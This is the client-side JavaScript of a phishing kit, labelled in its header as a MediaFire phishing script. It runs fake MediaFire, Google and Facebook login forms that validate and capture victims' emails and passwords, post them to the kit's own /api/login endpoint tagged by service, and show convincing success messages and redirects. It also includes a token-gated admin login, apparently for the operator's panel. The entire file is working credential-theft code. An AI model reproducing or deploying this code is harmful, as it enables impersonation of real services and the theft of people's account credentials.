// =============================================
// MEDIAFIRE PHISHING - CLIENT-SIDE SCRIPT
// =============================================

// Main Login Form Handler
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const errorMessage = document.getElementById('errorMessage');
            const submitBtn = loginForm.querySelector('button[type="submit"]');
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            
            // Hide previous error
            if (errorMessage) {
                errorMessage.style.display = 'none';
            }
            
            // Disable button during submission
            submitBtn.disabled = true;
            submitBtn.textContent = 'LOGGING IN...';
            
            // Simple validation
            if (!email) {
                showLoginError('Email is required.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'LOG IN';
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showLoginError('Please enter a valid email address.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'LOG IN';
                return;
            }
            
            if (!password) {
                showLoginError('Password is required.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'LOG IN';
                return;
            }
            
            if (password.length < 8) {
                showLoginError('Password must be at least 8 characters long.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'LOG IN';
                return;
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'main',
                        email: email,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Show success message
                    const successMsg = document.createElement('div');
                    successMsg.className = 'error-message';
                    successMsg.style.backgroundColor = '#E8F5E8';
                    successMsg.style.color = '#2E7D32';
                    successMsg.textContent = data.message || 'Redirecting...';
                    
                    if (errorMessage) {
                        errorMessage.parentNode.insertBefore(successMsg, errorMessage);
                    } else {
                        loginForm.insertBefore(successMsg, loginForm.firstChild);
                    }
                    
                    // Redirect after 1.5 seconds
                    setTimeout(() => {
                        window.location.href = data.redirect || '/success';
                    }, 1500);
                } else {
                    showLoginError(data.message || 'Login failed.');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'LOG IN';
                }
            } catch (error) {
                showLoginError('An error occurred. Please try again.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'LOG IN';
            }
        });
    }
    
    function showLoginError(message) {
        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }
    }
    
    // Google Login Form Handler
    const googleForm = document.getElementById('googleLoginForm');
    if (googleForm) {
        const googleEmail = document.getElementById('googleEmail');
        const googlePassword = document.getElementById('googlePassword');
        const googleError = document.getElementById('googleError');
        const googlePasswordStep = document.getElementById('googlePasswordStep');
        const googleEmailStep = document.getElementById('googleEmailStep');
        
        googleForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = googleEmail ? googleEmail.value.trim() : '';
            const password = googlePassword ? googlePassword.value : '';
            
            if (!email) {
                if (googleError) {
                    googleError.textContent = 'Email is required';
                    googleError.style.display = 'block';
                }
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                if (googleError) {
                    googleError.textContent = 'Please enter a valid email address';
                    googleError.style.display = 'block';
                }
                return;
            }
            
            if (!password) {
                if (googleError) {
                    googleError.textContent = 'Password is required';
                    googleError.style.display = 'block';
                }
                return;
            }
            
            if (password.length < 8) {
                if (googleError) {
                    googleError.textContent = 'Password must be at least 8 characters long';
                    googleError.style.display = 'block';
                }
                return;
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'google',
                        email: email,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    window.location.href = data.redirect || '/success';
                } else {
                    if (googleError) {
                        googleError.textContent = data.message || 'Login failed';
                        googleError.style.display = 'block';
                    }
                }
            } catch (error) {
                if (googleError) {
                    googleError.textContent = 'An error occurred. Please try again.';
                    googleError.style.display = 'block';
                }
            }
        });
    }
    
    // Facebook Login Form Handler
    const facebookForm = document.getElementById('facebookLoginForm');
    if (facebookForm) {
        const facebookEmail = document.getElementById('facebookEmail');
        const facebookPassword = document.getElementById('facebookPassword');
        const facebookError = document.getElementById('facebookError');
        
        facebookForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = facebookEmail ? facebookEmail.value.trim() : '';
            const password = facebookPassword ? facebookPassword.value : '';
            
            if (!email) {
                if (facebookError) {
                    facebookError.textContent = 'Email is required';
                    facebookError.style.display = 'block';
                }
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                if (facebookError) {
                    facebookError.textContent = 'Please enter a valid email address';
                    facebookError.style.display = 'block';
                }
                return;
            }
            
            if (!password) {
                if (facebookError) {
                    facebookError.textContent = 'Password is required';
                    facebookError.style.display = 'block';
                }
                return;
            }
            
            if (password.length < 8) {
                if (facebookError) {
                    facebookError.textContent = 'Password must be at least 8 characters long';
                    facebookError.style.display = 'block';
                }
                return;
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'facebook',
                        email: email,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    window.location.href = data.redirect || '/success';
                } else {
                    if (facebookError) {
                        facebookError.textContent = data.message || 'Login failed';
                        facebookError.style.display = 'block';
                    }
                }
            } catch (error) {
                if (facebookError) {
                    facebookError.textContent = 'An error occurred. Please try again.';
                    facebookError.style.display = 'block';
                }
            }
        });
    }
    
    // X Login Button Handler
    const xLoginButton = document.getElementById('xLoginButton');
    const xLoginMessage = document.getElementById('xLoginMessage');
    
    if (xLoginButton && xLoginMessage) {
        xLoginButton.addEventListener('click', function() {
            xLoginMessage.style.display = 'block';
        });
    }
    
    // Admin Login Form Handler
    const adminLoginForm = document.getElementById('adminLoginForm');
    if (adminLoginForm) {
        adminLoginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const tokenInput = document.getElementById('token');
            const emailInput = document.getElementById('email');
            const adminError = document.getElementById('adminError');
            const submitBtn = adminLoginForm.querySelector('button[type="submit"]');
            
            const token = tokenInput ? tokenInput.value.trim() : '';
            const email = emailInput ? emailInput.value.trim() : '';
            
            if (!token) {
                if (adminError) {
                    adminError.textContent = 'Token is required.';
                    adminError.style.display = 'block';
                }
                return;
            }
            
            if (!email) {
                if (adminError) {
                    adminError.textContent = 'Email is required.';
                    adminError.style.display = 'block';
                }
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                if (adminError) {
                    adminError.textContent = 'Please enter a valid email address';
                    adminError.style.display = 'block';
                }
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';
            
            try {
                const response = await fetch('/api/admin/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        token: token,
                        email: email
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Save token to localStorage
                    localStorage.setItem('adminToken', data.token);
                    localStorage.setItem('adminEmail', data.admin_email);
                    
                    // Redirect to admin dashboard
                    window.location.href = '/settings/panel';
                } else {
                    if (adminError) {
                        adminError.textContent = data.message || 'Invalid token or email';
                        adminError.style.display = 'block';
                    }
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Login';
                }
            } catch (error) {
                if (adminError) {
                    adminError.textContent = 'An error occurred. Please try again.';
                    adminError.style.display = 'block';
                }
                submitBtn.disabled = false;
                submitBtn.textContent = 'Login';
            }
        });
    }
    
    // Check admin authentication on protected pages
    function checkAdminAuth() {
        const token = localStorage.getItem('adminToken');
        const pathname = window.location.pathname;
        
        if (!token && pathname.includes('/settings/')) {
            window.location.href = '/settings';
        }
    }
    
    // Call on page load
    checkAdminAuth();
    
    // Admin Logout
    window.adminLogout = function() {
        localStorage.removeItem('adminToken');
        localStorage.removeItem('adminEmail');
        window.location.href = '/settings';
    };
    
    // Auto-hide error messages after 5 seconds
    const errorMessages = document.querySelectorAll('.error-message');
    errorMessages.forEach(function(msg) {
        if (msg.style.display === 'block') {
            setTimeout(function() {
                msg.style.display = 'none';
            }, 5000);
        }
    });
});

// Google Auth Step Navigation
function showGooglePasswordStep(email) {
    // This function would be used if implementing 2-step auth
    // For now, we use direct submission
}

// Utility function to debounce
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}
